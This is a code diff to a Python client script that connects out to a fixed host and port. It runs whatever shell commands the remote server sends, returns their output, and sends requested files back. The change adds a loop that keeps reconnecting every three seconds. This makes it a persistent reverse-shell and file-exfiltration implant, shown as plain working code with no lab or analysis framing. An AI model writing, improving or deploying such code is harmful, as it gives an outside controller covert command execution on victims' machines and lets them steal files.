@@ -11,51 +11,64 @@ def start_client():
     # host = '192.168.1.110'
     port = 12344
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-        client_socket.connect((host, port))
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+                client_socket.connect((host, port))
 
-        while True:
-            time.sleep(0.001)
-            client_socket.sendall(os.getcwd().encode('utf-8'))
-            # Receive command from the server
-            command = client_socket.recv(4096).decode('utf-8')
+                while True:
+                    try:
+                        time.sleep(0.001)
+                        client_socket.sendall(os.getcwd().encode('utf-8'))
+                        # Receive command from the server
+                        command = client_socket.recv(4096).decode('utf-8')
 
-            if command.lower().startswith('switch'):
-                continue
-            elif command.lower() == 'exit':
-                client_socket.close()
-                break
-            elif command.lower().startswith('download'):
-                # Extracting filename from the command
-                _, filepath = command.split(' ', 1)
-                print(f"receive filepath {filepath}")
+                        if command.lower().startswith('switch'):
+                            continue
+                        elif command.lower() == 'exit':
+                            client_socket.close()
+                            break
+                        elif command.lower().startswith('download'):
+                            # Extracting filename from the command
+                            _, filepath = command.split(' ', 1)
+                            print(f"receive filepath {filepath}")
 
-                if download_file(client_socket, filepath=filepath):
-                    continue
-                else:
-                    client_socket.sendall('%-> File not found'.encode("utf-8"))
+                            if download_file(client_socket, filepath=filepath):
+                                continue
+                            else:
+                                client_socket.sendall('%-> File not found'.encode("utf-8"))
 
-            cd_result = handle_cd(command)
-            if cd_result:
-                client_socket.sendall(cd_result.encode('utf-8'))
-                continue
+                        cd_result = handle_cd(command)
+                        if cd_result:
+                            client_socket.sendall(cd_result.encode('utf-8'))
+                            continue
 
-            try:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-                # Handel if the command return nothing
-                if result.stdout == "":
-                    client_socket.sendall("Null".encode('utf-8'))
-                    continue
+                        # Handel if the command return nothing
+                        if result.stdout == "":
+                            client_socket.sendall("Null".encode('utf-8'))
+                            continue
 
-                # Send the result back to the server
-                client_socket.sendall(result.stdout.encode('utf-8'))
-                continue
+                        # Send the result back to the server
+                        client_socket.sendall(result.stdout.encode('utf-8'))
+                        continue
 
-            except Exception as e:
-                # Send any errors back to the server
-                client_socket.sendall(str(e).encode('utf-8'))
-                continue
+                    except Exception as e:
+                        # Send any errors back to the server
+                        client_socket.sendall(str(e).encode('utf-8'))
+                        continue
+        except(socket.error, ConnectionRefusedError, ConnectionResetError) as e:
+            print(f"Connection failed: {e}")
+            print("Retrying in 3 seconds...")
+            time.sleep(3)
+        except Exception as e:
+            print(f"Connection failed: {e}")
+            print("Retrying in 3 seconds...")
+            time.sleep(3)
+        finally:
+            print("Closing connection")
+            client_socket.close()
 
 
 if __name__ == "__main__":
